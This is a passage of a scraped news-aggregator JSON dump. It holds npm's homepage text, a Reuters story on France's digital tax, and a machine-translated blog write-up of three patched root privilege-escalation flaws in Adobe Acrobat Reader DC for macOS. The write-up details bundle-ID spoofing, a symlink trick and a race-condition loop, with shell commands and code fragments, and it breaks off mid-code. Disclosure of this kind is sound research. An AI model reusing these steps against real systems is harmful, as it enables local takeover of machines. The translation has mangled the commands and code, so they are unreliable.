Enterprise\u63d0\u4f9b\u62e5\u6709\u6570\u767e\u540d\u5f00\u53d1\u4eba\u5458\u7684\u7ec4\u7ec7\u6240\u9700\u7684\u529f\u80fd\uff0c\u5982\u5355\u70b9\u767b\u5f55\u548c\u589e\u5f3a\u7684\u5b89\u5168\u6027\u3002\n\u6211\u4eec\u7684\u5b89\u5168\u56e2\u961f\u5bf9JavaScript\u6f0f\u6d1e\u548c\u5a01\u80c1\u7684\u72ec\u7279\u89c1\u89e3\u4ee5\u514d\u8d39\u548c\u9ad8\u7ea7\u529f\u80fd\u7684\u5f62\u5f0f\u63d0\u4f9b\uff0c\u5e76\u4e3a\u7ecf\u9500\u5546\u548c\u5176\u4ed6\u4eba\u63d0\u4f9b\u670d\u52a1\u3002\n\u5728NPM\uff0cInc.\uff0c\u6211\u4eec\u5f88\u81ea\u8c6a\u80fd\u6d3e\u51fa\u5168\u804c\u5458\u5de5\u56e2\u961f\u6765\u8fd0\u8425NPM\u6ce8\u518c\u8868\u3001\u589e\u5f3aCLI\u3001\u63d0\u9ad8JavaScript\u5b89\u5168\u6027\uff0c\u4ee5\u53ca\u652f\u6301\u548c\u57f9\u80b2\u5145\u6ee1\u6d3b\u529b\u7684\u5f00\u6e90\u793e\u533a\u7684\u5176\u4ed6\u9879\u76ee\u3002", "note_en": "We&#39;re npm, Inc., the company behind Node package manager, the npm\r Registry, and npm CLI. We offer those to the community for free, but\r our day job is building and selling useful tools for developers like you.\n    Get started today for free, or step up to npm Pro to enjoy a premium\r JavaScript development experience, with features like private packages.\n  Relied upon by more than 11 million developers worldwide, npm is committed to\r making JavaScript development elegant, productive, and safe. The free npm\r Registry has become the center of JavaScript code sharing, and with more than\r one million packages, the largest software registry in the world. Our other\r tools and services take the Registry, and the work you do around it, to the\r next level.\n  Become a contributing member of the open source JavaScript community. Create\r public packages, publish updates, audit your dependencies, and more.\n  For next-level JavaScript developers who want more capabilities. Pro and Teams\r add the ability to build private packages for you, your team, or for customers.\n  For very large teams and business-critical projects, npm Enterprise delivers\r features that organizations with hundreds of developers need, like SSO and\r enhanced security.\n  Our security team&#39;s unique insights into JavaScript vulnerabilities and threats\r are delivered as free and premium features, as well as services for resellers\r and others.\n  At npm, Inc., we&#39;re proud to dedicate teams of full-time employees to operating\r the npm Registry, enhancing the CLI, improving JavaScript security, and other\r projects that support and nurture a vibrant open source community.", "posttime": "2020-05-15 00:22:17", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "npm", "title": "NPM\u5df2\u505c\u673a", "title_en": "NPM Is Down", "transed": 1, "url": "https://www.npmjs.com", "via": "", "real_tags": ["npm"]}, {"category": "", "categoryclass": "", "imagename": "e23defc6e1d3be74cebe8cc3673a3096.jpeg", "infoid": 1002109, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5df4\u9ece(\u8def\u900f\u793e)-\u6cd5\u56fd\u8d22\u653f\u90e8\u957f\u5468\u56db\u8868\u793a\uff0c\u65e0\u8bba\u5728\u5f81\u7a0e\u65b9\u9762\u8fbe\u6210\u56fd\u9645\u534f\u8bae\u662f\u5426\u53d6\u5f97\u8fdb\u5c55\uff0c\u6cd5\u56fd\u4eca\u5e74\u90fd\u5c06\u5bf9\u5927\u578b\u6570\u5b57\u4f01\u4e1a\u5f81\u7a0e\uff0c\u5e76\u8865\u5145\u79f0\uff0c\u8fd9\u6837\u7684\u7a0e\u6536\u4ece\u672a\u50cf\u73b0\u5728\u8fd9\u6837\u5408\u6cd5\uff0c\u4e5f\u4ece\u672a\u50cf\u73b0\u5728\u8fd9\u6837\u6709\u5fc5\u8981\u3002\n\u7ecf\u6d4e\u5408\u4f5c\u4e0e\u53d1\u5c55\u7ec4\u7ec7(OECD)\u7684\u8fd1140\u4e2a\u56fd\u5bb6\u6b63\u5728\u5c31\u4e00\u4ee3\u591a\u4ee5\u6765\u9996\u6b21\u91cd\u5927\u6539\u5199\u7a0e\u6536\u89c4\u5219\u8fdb\u884c\u8c08\u5224\uff0c\u4ee5\u66f4\u597d\u5730\u8003\u8651\u5230\u4e9a\u9a6c\u900a(Amazon)\u3001Facebook\u3001\u82f9\u679c(Apple)\u548c\u8c37\u6b4c(Google)\u7b49\u5927\u578b\u79d1\u6280\u516c\u53f8\u7684\u5d1b\u8d77\uff0c\u8fd9\u4e9b\u516c\u53f8\u7ecf\u5e38\u5728\u4f4e\u7a0e\u6536\u56fd\u5bb6\u5f55\u5f97\u5229\u6da6\u3002\n\u4eca\u5e741\u6708\uff0c\u5df4\u9ece\u65b9\u9762\u63d0\u51fa\uff0c\u5728\u8c08\u5224\u4efb\u4f55\u56fd\u9645\u4ea4\u6613\u671f\u95f4\uff0c\u5c06\u6682\u505c\u5bf9\u79d1\u6280\u516c\u53f8\u5728\u6cd5\u56fd\u7684\u6536\u5165\u5f81\u6536\u6570\u5b57\u7a0e\uff0c\u76f4\u5230\u4eca\u5e74\u5e74\u5e95\u3002\n\u7136\u800c\uff0c\u51a0\u72b6\u75c5\u6bd2\u7206\u53d1\u7684\u4f59\u6ce2\u8ba9\u5404\u56fd\u8d22\u653f\u90e8\u6700\u4e13\u6ce8\u4e8e\u62ef\u6551\u672c\u56fd\u7ecf\u6d4e\uff0c\u53ef\u80fd\u5371\u53ca\u5e74\u5e95\u7684\u6700\u540e\u671f\u9650\u3002\n\u8d22\u653f\u90e8\u957f\u5e03\u9c81\u8bfa\u00b7\u52d2\u6885\u5c14(Bruno Le Maire)\u5728\u7535\u8bdd\u4f1a\u8bae\u4e0a\u544a\u8bc9\u8bb0\u8005\uff1a\u201c\u6570\u5b57\u7a0e\u4ece\u672a\u50cf\u73b0\u5728\u8fd9\u6837\u5408\u6cd5\u548c\u5fc5\u8981\u3002\u201d\u4ed6\u8865\u5145\u8bf4\uff0c\u8fd9\u4e9b\u516c\u53f8\u5728\u51a0\u72b6\u75c5\u6bd2\u5371\u673a\u671f\u95f4\u7684\u8868\u73b0\u6bd4\u5927\u591a\u6570\u516c\u53f8\u90fd\u8981\u597d\u3002\n\u201c\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u6cd5\u56fd\u90fd\u5c06\u9002\u7528\uff0c\u56e0\u4e3a\u5b83\u4e00\u76f4\u8868\u793a\uff0c\u5982\u679c\u8fbe\u6210\u534f\u8bae\uff0c2020\u5e74\u5c06\u5bf9\u6570\u5b57\u5de8\u5934\u5f81\u7a0e\uff0c\u5982\u679c\u8fbe\u6210\u534f\u8bae\uff0c\u5c06\u4ee5\u56fd\u9645\u5f62\u5f0f\u5f81\u7a0e\uff0c\u5982\u679c\u6ca1\u6709\u534f\u8bae\uff0c\u5c06\u4ee5\u56fd\u5bb6\u5f62\u5f0f\u5f81\u7a0e\u3002\u201d\n\u76f8\u6bd4\u4e4b\u4e0b\uff0c\u6377\u514b\u8d22\u653f\u90e8\u957f\u963f\u83b1\u5a1c\u00b7\u5e0c\u52d2\u7f57\u5a03(Alena Schillerova)\u8868\u793a\uff0c\u5979\u53ef\u80fd\u4f1a\u5c06\u6570\u5b57\u7a0e\u7684\u5f15\u5165\u63a8\u8fdf\u5230\u660e\u5e74\uff0c\u4ee5\u5229\u7528\u4efb\u4f55\u56fd\u9645\u89c4\u5219\uff0c\u5e76\u5c06\u7a0e\u7387\u4ece\u76ee\u524d\u63d0\u8bae\u76847%\u964d\u81f35%\u3002\n\u6cd5\u56fd\u7684\u56fd\u5bb6\u7a0e\u4e00\u76f4\u662f\u4e0e\u534e\u76db\u987f\u4e89\u6267\u7684\u4e00\u4e2a\u6765\u6e90\uff0c\u534e\u76db\u987f\u8ba4\u4e3a\u5b83\u9488\u5bf9\u7684\u662f\u7f8e\u56fd\u6570\u5b57\u516c\u53f8\uff0c\u8fd9\u662f\u4e0d\u516c\u5e73\u7684\u3002\n\u957f\u671f\u4ee5\u6765\uff0c\u6b27\u6d32\u4e00\u76f4\u5728\u63a8\u52a8\u8ba9\u5728\u4e92\u8054\u7f51\u4e0a\u505a\u751f\u610f\u7684\u5229\u6da6\u4e30\u539a\u7684\u5927\u578b\u79d1\u6280\u516c\u53f8\u5728\u51fa\u552e\u670d\u52a1\u7684\u5730\u65b9\u7eb3\u7a0e\uff0c\u800c\u4e0d\u662f\u5728\u6240\u8c13\u7684\u201c\u79ef\u6781\u7a0e\u6536\u4f18\u5316\u201d\u4e0b\u523b\u610f\u9009\u62e9\u7684\u907f\u7a0e\u5929\u5802\u3002\n\u6b27\u76df\u653f\u754c\u4eba\u58eb\u5e0c\u671b\u770b\u5230\u8c37\u6b4c\u8fd9\u6837\u4e00\u5bb6\u5168\u7403\u5e74\u6536\u5165\u8d85\u8fc71600\u4ebf\u7f8e\u5143\u7684\u516c\u53f8\uff0c\u5728\u8d5a\u94b1\u7684\u6b27\u6d32\u56fd\u5bb6\u7f34\u7eb3\u66f4\u591a\u7a0e\u6b3e\uff0c\u6700\u597d\u662f\u7edf\u4e00\u7a0e\u7387\u3002\u6b27\u76df\u653f\u754c\u4eba\u58eb\u6b63\u5728\u5bfb\u6c42\u8d44\u91d1\uff0c\u4ee5\u9632\u6b62\u6c14\u5019\u53d8\u5316\uff0c\u7f29\u5c0f\u6b27\u76df27\u56fd\u7684\u8d2b\u5bcc\u5dee\u8ddd\u3002\n\u7531\u4e8e\u906d\u5230\u79d1\u6280\u5de8\u5934\u603b\u90e8\u6240\u5728\u7684\u7f8e\u56fd\u7684\u53cd\u5bf9\uff0c\u5168\u7403\u7f3a\u4e4f\u8fdb\u5c55\uff0c\u4ee4\u4eba\u6cae\u4e27\u7684\u662f\uff0c\u6cd5\u56fd\u7b49\u4e00\u4e9b\u56fd\u5bb6\u53bb\u5e74\u63a8\u51fa\u4e86\u81ea\u5df1\u7684\u6570\u5b57\u7a0e\u3002\u610f\u5927\u5229\u3001\u82f1\u56fd\u548c\u897f\u73ed\u7259\u4e5f\u5df2\u7ecf\u6216\u8ba1\u5212\u63a8\u51fa\u81ea\u5df1\u7684\u6570\u5b57\u7a0e\u3002\n\u51a0\u72b6\u75c5\u6bd2\u5927\u6d41\u884c\u589e\u52a0\u4e86\u89e3\u51b3\u65b9\u6848\u7684\u7d27\u8feb\u6027\uff0c\u5b83\u5f15\u53d1\u4e86\u5168\u7403\u8303\u56f4\u7684\u5c01\u9501\u548c\u8f6c\u5411\u5728\u5bb6\u5de5\u4f5c\u3002\u8fd9\u53ef\u80fd\u4f1a\u589e\u52a0\u4e92\u8054\u7f51\u5de8\u5934\u7684\u6536\u5165\uff0c\u4f46\u4e5f\u4f1a\u4f7f\u6b27\u76df\u5404\u56fd\u653f\u5e9c\u66f4\u52a0\u9700\u8981\u73b0\u91d1\u6765\u91cd\u542f\u4ed6\u4eec\u9884\u8ba1\u4eca\u5e74\u51fa\u73b0\u7684\u6709\u53f2\u4ee5\u6765\u6700\u4e25\u91cd\u7684\u8870\u9000\u3002\n\u7531\u4e8e\u7231\u5c14\u5170\u548c\u4e00\u4e9b\u5317\u6b27\u56fd\u5bb6\u7684\u53cd\u5bf9\uff0c\u8fc7\u53bb\u5728\u6574\u4e2a\u6b27\u76df\u8303\u56f4\u5185\u521b\u5efa\u6570\u5b57\u7a0e\u7684\u5c1d\u8bd5\u90fd\u4ee5\u5931\u8d25\u544a\u7ec8\u3002\u5728\u7231\u5c14\u5170\uff0c\u8bb8\u591a\u7f8e\u56fd\u5927\u578b\u79d1\u6280\u516c\u53f8\u90fd\u5f55\u5f97\u4e86\u5229\u6da6\u3002", "note_en": "PARIS (Reuters) - France will tax big digital businesses this year whether there is progress or not towards an international deal on a levy, its finance minister said on Thursday, adding such a tax had never been more legitimate or more necessary.\n  Nearly 140 countries from the Organisation for Economic Cooperation and Development (OECD) are negotiating the first major rewriting of tax rules in more than a generation, to take better account of the rise of big tech companies such as Amazon, Facebook, Apple and Google that often book profit in low-tax countries.\n Paris offered in January to suspend its digital tax on tech companies\u2019 income in France until the end of the year while any international deal was negotiated.\n However, the fallout from the coronavirus outbreak has left finance ministries most focused on saving their economies, potentially jeopardising the end of the year deadline.\n \u201cNever has a digital tax been more legitimate and more necessary,\u201d Finance Minister Bruno Le Maire told journalists on a conference call, adding such companies were doing better than most during the coronavirus crisis.\n \u201cIn any case, France will apply as it has always indicated a tax on digital giants in 2020 either in an international form if there is a deal or in a national form if there is no deal.\u201d\n In the Czech Republic by contrast, Finance Minister Alena Schillerova said she may delay the introduction of a digital tax until next year, to take advantage of any international rule, and lower the rate to 5% from a currently proposed 7%.\n France\u2019s national tax has been a source of contention with Washington, which considers that it unfairly targets U.S. digital companies.\n  Europe has long pushed to make hugely profitable large tech companies doing business over the internet pay tax where they sell their services, rather than in tax havens deliberately chosen under what is called \u201caggressive tax optimisation\u201d.\n EU politicians, seeking funds to prevent climate change and diminish wealth differences across the 27-nation bloc, want to see a company like Google, with an annual global revenue of more than $160 billion, pay more tax in the European countries where it makes money, preferably at a uniform rate.\n Frustrated with the lack of global progress because of opposition from the United States where the tech giants are based, some countries like France introduced their own digital tax last year. Italy, Britain and Spain have also either already introduced their own digital taxes or plan to do so.\n  The urgency for a solution is increased by the COVID-19 pandemic, which triggered lockdowns around the globe and a shift to working from home. This is likely to boost the revenues of internet giants but also makes EU governments even more in need of cash to restart their economies from their deepest ever recession expected this year.\n Past attempts to create an EU-wide digital tax have failed in the face of opposition from Ireland, where many big U.S. tech companies book profits, and some Nordic countries.", "posttime": "2020-05-15 00:07:43", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u4ea4\u6613,\u4eca\u5e74,digital,\u56fd\u5bb6", "title": "\u6cd5\u56fd\u4eca\u5e74\u5c06\u7ee7\u7eed\u63a8\u8fdb\u6570\u5b57\u7a0e\uff0c\u4e0d\u7ba1\u53ef\u80fd\u7684\u56fd\u9645\u4ea4\u6613", "title_en": "France To Go Ahead With Digital Tax This Year Regardless of Possible International Deal", "transed": 1, "url": "https://www.reuters.com/article/us-france-digital-tax/france-to-go-ahead-with-digital-tax-this-year-regardless-of-possible-international-deal-idUSKBN22Q25B", "via": "", "real_tags": ["\u4ea4\u6613", "\u4eca\u5e74", "digital", "\u56fd\u5bb6"]}, {"category": "", "categoryclass": "", "imagename": "3a20791feb41759f3f28e4058962a161.png", "infoid": 1002107, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4eca\u5929\uff0cAdobe Acrobat Reader DC for MacOS\u4fee\u8865\u4e86\u6211\u62a5\u544a\u7684\u4e09\u4e2a\u5173\u952e\u6f0f\u6d1e(CVE-2020-9615\u3001CVE-2020-9614\u548cCVE-2020-9613)\u3002\u89e6\u53d1\u6f0f\u6d1e\u7684\u552f\u4e00\u8981\u6c42\u662f\u5df2\u5b89\u88c5Adobe Acrobat Reader DC\u3002MacOS\u4e0a\u7684\u666e\u901a\u7528\u6237(\u542f\u7528\u4e86SIP)\u53ef\u4ee5\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u672c\u5730\u5229\u7528\u6b64\u6f0f\u6d1e\u94fe\u5c06\u6743\u9650\u63d0\u5347\u5230\u6839\u76ee\u5f55\u3002\u5728\u672c\u535a\u5ba2\u4e2d\uff0c\u6211\u5c06\u5206\u6790\u6f0f\u6d1e\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5e76\u5c55\u793a\u5982\u4f55\u5229\u7528\u5b83\u4eec\u3002\n\u6839\u8fdb\u7a0b\u62e5\u6709\u8d85\u5f3a\u7684\u529f\u80fd\uff0c\u5b83\u51e0\u4e4e\u53ef\u4ee5\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u8bfb/\u5199\u6240\u6709\u654f\u611f\u7684\u6587\u4ef6/\u6570\u636e\u5e93\uff0c\u5982\u56fe\u50cf/\u65e5\u5386\u3002\u7136\u800c\uff0c\u5728\u73b0\u4ee3MacOS\u4e2d\uff0c\u6c99\u7bb1\u5916\u7684\u6839\u8fdb\u7a0b\u5f88\u5c11\uff0c\u5927\u591a\u6570MacOS\u5185\u7f6e\u670d\u52a1\u90fd\u5728\u6c99\u7bb1\u4e2d\u8fd0\u884c\u3002\u4ed6\u4eec\u4e0d\u518d\u662f\u56fd\u738b\uff0c\u4ed6\u4eec\u5c06\u81ea\u5df1\u56da\u7981\u5728\u57fa\u4e8e\u58f0\u660e\u6027\u6c99\u76d2\u914d\u7f6e\u6587\u4ef6\u89c4\u5219\u7684\u7b3c\u5b50\u91cc\u3002\n\u597d\u6d88\u606f\u662f\uff0c\u9664\u4e86MacOS\u5185\u7f6e\u670d\u52a1\u4e4b\u5916\uff0c\u5177\u6709\u9ad8\u7279\u6743\u670d\u52a1\u7684\u6d41\u884c\u8f6f\u4ef6\u662f\u65b0\u7684\u597d\u76ee\u6807\uff0c\u6240\u4ee5Adobe Acrobat Reader DC\u5f15\u8d77\u4e86\u6211\u7684\u6ce8\u610f\u3002\n/Library/PrivilegedHelperTools/\u4e2d\u7684com.adobe.ARMDC.SMJobBless Helper\u662fAdobe Acrobat Reader DC\u7684\u7ec4\u4ef6\u4e4b\u4e00\uff0c\u8d1f\u8d23\u8f6f\u4ef6\u66f4\u65b0\u3002\u5b83\u4ee5\u6839\u7528\u6237\u548c\u65e0\u6c99\u7bb1\u5e94\u7528\u7684\u8eab\u4efd\u8fd0\u884c\uff0c\u5e76\u6258\u7ba1\u540d\u4e3aSMJobBlessHelper(com.adobe.ARMDC.SMJobBlessHelper).\u7684xpc\u670d\u52a1\u3002\u5927\u591a\u6570xPC\u670d\u52a1\u5728\u6267\u884c\u4efb\u4f55\u5b9e\u9645\u5de5\u4f5c\u4e4b\u524d\u90fd\u4f1a\u68c0\u67e5\u5176\u8fde\u63a5\u5ba2\u6237\u673a\uff0cSMJobBless Helper\u4e5f\u662f\u5982\u6b64\u3002\nSMJobBless Helper\u57fa\u4e8eNSXPC\uff0c\u5176\u5ba2\u6237\u7aef\u68c0\u67e5\u5b58\u5728\u4e8e[SMJobBless Helper Listener\uff1ashouldAcceptNewConnection\uff1a]\u4e2d\u3002\u68c0\u67e5\u903b\u8f91\u5982\u4e0b\u56fe\u4f2a\u4ee3\u7801\u6240\u793a\uff0c\u83b7\u53d6\u5ba2\u6237\u7aef\u7684PID\uff0c\u7136\u540e\u6839\u636e\u5ba2\u6237\u7aef\u7684\u8fdb\u7a0b\u8def\u5f84\u83b7\u53d6Bundle ID\uff0c\u5982\u679cBundle ID\u4e3a\u201ccom.adobe.ARMDC\u201d\uff0c\u5219\u5ba2\u6237\u7aef\u662f\u53ef\u4fe1\u7684\u3002\npid=[NSXPCConnection processIdentifier]\uff1bproc_pidpath(v7\uff0cproc_path\uff0c0x1000u)\uff1bbundle=[NSBundle bundleWithPath\uff1aproc_path]\uff1bbd_id=[bundle bundleIdentifier]\uff1bif(bd_id==&#34\uff1bcom.adobe.ARMDC&#34\uff1b){//\u63a5\u53d7\u5ba2\u6237\u7aef\u7684xPC\u8fde\u63a5\u8bf7\u6c42}\u3002\n\u82f9\u679c\u79f0\u5b83\u662f\u201c\u5b58\u50a8\u5728\u78c1\u76d8\u6346\u7ed1\u76ee\u5f55\u4e2d\u7684\u4ee3\u7801\u548c\u8d44\u6e90\u7684\u8868\u793a\u201d\uff0c\u6240\u4ee5\u5b83\u53ea\u662f\u4e00\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u542b\u4e00\u4e9b\u5b9a\u4e49\u826f\u597d\u7684\u5b50\u76ee\u5f55/\u6587\u4ef6\u3002\u5305ID\u4ece\u76ee\u5f55\u7ed3\u6784\u7684Contents/Info.plist\u83b7\u5f97\u3002\n\u76ee\u5f55\u7ed3\u6784\u80af\u5b9a\u662f\u4e0d\u53ef\u4fe1\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u7279\u6b8a\u7684\u6346\u7ed1\u5305\u76ee\u5f55\u6765\u4f2a\u9020\u4efb\u4f55\u6346\u7ed1\u5305ID\u3002\n\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u5728SMJobBless Helper\u542f\u52a8ARMDCHammer\u4e4b\u524d\u7684\u66f4\u65b0\u8fc7\u7a0b\u4e2d\uff0c\u4e0b\u8f7d\u6587\u4ef6\u5939(\u5728\u5305\u7684\u7236\u76ee\u5f55\u4e2d)\u5c06\u79fb\u52a8\u5230/var/Folders/ZZ/xxxxx/T/\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u5728\u76ee\u5f55\u79fb\u52a8\u4e4b\u540e\uff0c\u201c/var/folders/zz/xxxxx_n0000000000000/T/download\u201d\u7684\u6240\u6709\u8005\u662f\u6839\u7528\u6237\uff0c\u666e\u901a\u7528\u6237\u65e0\u6743\u8bbf\u95ee\u5b83\u3002\u6240\u4ee5\u8fd9\u610f\u5473\u7740\u6211\u4eec\u4e0d\u80fd\u518d\u66f4\u6539\u5b83\u53ca\u5176\u5b50\u6587\u4ef6\u3002\n\u5982\u679c./download/ARMDCHammer\u662f\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u5728\u79fb\u52a8\u5230/var/Folders/ZZ/xxxxx/T/download\u4e4b\u540e\uff0c\u8be5\u7b26\u53f7\u94fe\u63a5\u662f\u5426\u4ecd\u7136\u6709\u6548\uff1f\n\u662f\u7684\uff0c\u7b26\u53f7\u94fe\u63a5\u4ecd\u7136\u6709\u6548\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7ed5\u8fc7\u4e34\u65f6\u76ee\u5f55\u4fdd\u62a4\u3002\u6211\u53ef\u4ee5\u5f3a\u5236/var/Folders/ZZ/xxxxx/T/download/ARMDCHammer\u94fe\u63a5\u5230\u4efb\u4f55\u5730\u65b9\u3002\nvalidateBinary\u548cLaunchARMHammer\u90fd\u4f7f\u7528\u7a0b\u5e8f\u8def\u5f84\uff0c\u6211\u4eec\u5bf9\u8be5\u8def\u5f84\u6709\u5199\u5165\u6743\u9650\u3002\n\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5728validateBinary\u4e4b\u540e\u5c06\u201c/tmp/test/hello_root\u201d\u66ff\u6362\u4e3a\u6211\u4eec\u7684\u6076\u610f\u6587\u4ef6\uff0c\u5219LaunchARMHammer\u5c06\u542f\u52a8\u6211\u4eec\u7684\u6076\u610f\u8fdb\u7a0b\u3002\n\u4f60\u53ef\u80fd\u4f1a\u8ba4\u4e3a\u6bd4\u8d5b\u6761\u4ef6\u7a97\u53e3\u592a\u7a84\uff0c\u65e0\u6cd5\u63a7\u5236\uff0c\u6211\u7a0d\u540e\u4f1a\u5c55\u793a\u8fd9\u4e9b\u6280\u5de7\u3002\n\u5982\u524d\u6240\u8ff0\uff0cNSBundle\u4e0d\u53d7\u4fe1\u4efb\uff0c\u56e0\u6b64\u6211\u4eec\u5c1d\u8bd5\u4f2a\u9020\u4e00\u4e2aNSBundle\uff0c\u5176\u5305id\u4e3a\u201ccom.adobe.ARMDC\u201d\u3002\u4e3a\u4e86\u8282\u7701\u65f6\u95f4\uff0c\u6211\u4eec\u4ece\u201c/Library/Application Support/Adobe/ARMDC/Application/Adobe Acrobat Updater.app\u201d\u590d\u5236\u4e86Adobe\u7684\u539f\u59cb\u6346\u7ed1\u5305\u3002\ncd/tmp/test/exploit echo&#34\uff1b\u7f16\u8bd1SMJobBless Helper-Developit&#34\uff1bclang-framework Foundation SMJobBless Helper-Developit.m-o SMJobBless Helper-Developit echo&#34\uff1bMove SMJobBless Helper-Developit to Adobe Acrobat Updater.app&#34\uff1bmkdir&#34\uff1bAdobe Acrobat Updater.app/Contents/MacOS&#34\uff1bMV SMJobBless Helper-Developit(\u5c06SMJobBless Helper-Developit\u79fb\u52a8\u5230Adobe Acrobat Updater.app/Contents/MacOS&#34\uff1bMV)\n\u73b0\u5728\uff0c\u4f5c\u4e3aNSXPC\u5ba2\u6237\u7aef\u542f\u52a8\u7684SMJobBless Helper-Developit\u5c06\u901a\u8fc7[SMJobBless Helper Listener\uff1ashouldAcceptNewConnection\uff1a]\u7684\u68c0\u67e5\u3002\nSymlink\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\uff0c\u5728SMJobBless Helper\u79fb\u52a8\u6211\u4eec\u7684\u4e0b\u8f7d\u76ee\u5f55\u4e4b\u524d\uff0c\u6211\u4eec\u4f1a\u5728\u6211\u4eec\u7684\u4e0b\u8f7d\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u7b26\u53f7\u94fe\u63a5\u3002\n$cd/tmp/test$mkdir\u4e0b\u8f7d$ln-s/tmp/test/hello_root./download/ARMDCHammer$ls-l download/total 0 lrwxr-xr-x 1 rekken Staff 72 4 12 16\uff1a04 ARMDCHammer-&gt\uff1b/tmp/test/hello_root\u3002\n$sudo ls-l/var/Folders/zz/xxxxx/T/\u4e0b\u8f7d\u603b\u65700 lrwxr-xr-x 1\u4e2a\u6ce8\u518c\u5458\u5de572 4 12 16\uff1a04 ARMDCHammer-&gt\uff1b/tmp/test/hello_root\u3002\n(Lldb)po$RCX(&#34\uff1b--Verify&#34\uff1b\uff0c&#34\uff1b-R=\u6807\u8bc6\u7b26ARMDCHammer\u548c\u951a\u5b9a\u53ef\u4fe1\u548c\u951a\u5b9a\u82f9\u679c\u901a\u7528\u548c\u8bc1\u4e66\u53f6[subject.CN]=\\&#34\uff1b\u5f00\u53d1\u8005ID\u5e94\u7528\u7a0b\u5e8f\uff1aAdobe Systems\uff0cInc.\u3002(JQ525L2MZD)\\&#34\uff1b&#34\uff1b\uff0c&#34\uff1b/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/download/ARMDCHammer&#34\uff1b)\u3002\n\u6211\u7f16\u5199\u4e86\u4e00\u4e2a\u811a\u672c\uff0c\u5728\u6574\u4e2a\u672c\u5730\u78c1\u76d8\u4e2d\u641c\u7d22ARMDCHammer\uff0c\u6700\u540e\u4e00\u65e0\u6240\u83b7\u3002\u4f46\u5b83\u80af\u5b9a\u5b58\u5728\uff0c\u4e0d\u662f\u5417\uff1f\n\u7531\u4e8e\u5b83\u4e0d\u5728\u672c\u5730\u9a71\u52a8\u5668\u4e0a\uff0c\u56e0\u6b64\u5e94\u8be5\u5df2\u6309\u9700\u4e0b\u8f7d\u3002\u6211\u7ffb\u8f6c\u4e86\u5f88\u591a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5728Acrobat Update Helper.app\u4e2d\u627e\u5230\u4e86\u53ef\u7231\u7684\u4e0b\u8f7dURL\u3002\u4e0b\u8f7d\u5e76\u89e3\u538b\u7f29\u5f52\u6863\u6587\u4ef6\uff0c\u6700\u540e\uff0c\u6211\u627e\u5230\u4e86\u6211\u6b63\u5728\u5bfb\u627e\u7684ARMDCHammer\u3002\n$CoDesign--Verbose--Verify-R=&#34\uff1b\u6807\u8bc6\u7b26ARMDCHammer\u548c\u951a\u5b9a\u53d7\u4fe1\u4efb\u548c\u951a\u5b9a\u82f9\u679c\u901a\u7528\u548c\u8bc1\u4e66\u53f6[subject.CN]=\\&#34\uff1b\u5f00\u53d1\u8005ID\u5e94\u7528\u7a0b\u5e8f\uff1aAdobe Systems\uff0cInc.\u3002(JQ525L2MZD)\\&#34\uff1b&#34\uff1b~/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer\uff1a\u5728\u78c1\u76d8/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer\uff1a\u4e0a\u6709\u6548\u6ee1\u8db3\u5176\u6307\u5b9a\u8981\u6c42/Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer\uff1a\u663e\u5f0f\u8981\u6c42\u5f97\u5230\u6ee1\u8db3\nvalidateBinary\u548cLaunchARMHammer\u4e4b\u95f4\u7684\u65f6\u95f4\u7a97\u53e3\u8f83\u7a84\u3002OPLock\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728Windows\u4e2d\u51bb\u7ed3\u65f6\u95f4\uff0c\u4e0d\u5e78\u7684\u662f\uff0c\u5728MacOS\u4e2d\u6ca1\u6709\u8fd9\u6837\u7684\u9009\u62e9\u3002\n\u6b65\u9aa41\uff1a\u5c06/tmp/test/ARMDCHammer\u79fb\u81f3/tmp/test/hello_root\uff0c\u6b65\u9aa42\uff1a\u4f11\u7720\u6b65\u9aa43\uff1a\u5c06/tmp/test/hello_root\u79fb\u81f3/tmp/test/ARMDCHammer\u6b65\u9aa44\uff1a\u4f11\u7720\u5e76\u8f6c\u81f3\u6b65\u9aa41\u3002\n\u6b65\u9aa41\uff1a\u521b\u5efa/tmp/test/orig_download\u76ee\u5f55\uff0c\u521b\u5efasymlink/tmp/test/orig_download/ARMDCHammer\u6307\u5411/tmp/test/hello_root\u6b65\u9aa42\uff1a\u5c06/tmp/test/orig_download\u590d\u5236\u5230/tmp/test/download\u6b65\u9aa43\uff1a\u4f11\u7720\u6b65\u9aa44\uff1a\u5f53/tmp/test/download\u6d88\u5931\u65f6\u8f6c\u81f3\u6b65\u9aa42\u3002\nWHILE(1){NSXPCConnection*ConnectionToService=[[NSXPCConnection Alalloc]initWithMachServiceName\uff1a@&#34\uff1bcom.adobe.ARMDC.SMJobBlessHelper&#34\uff1b\u9009\u9879\uff1a0]\uff1bConnectionToService.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol\uff1a@protocol(SMJobBlessHelperProtocol)]\uff1b[ConnectionToService Resume]\uff1bid Remote=[ConnectionToService 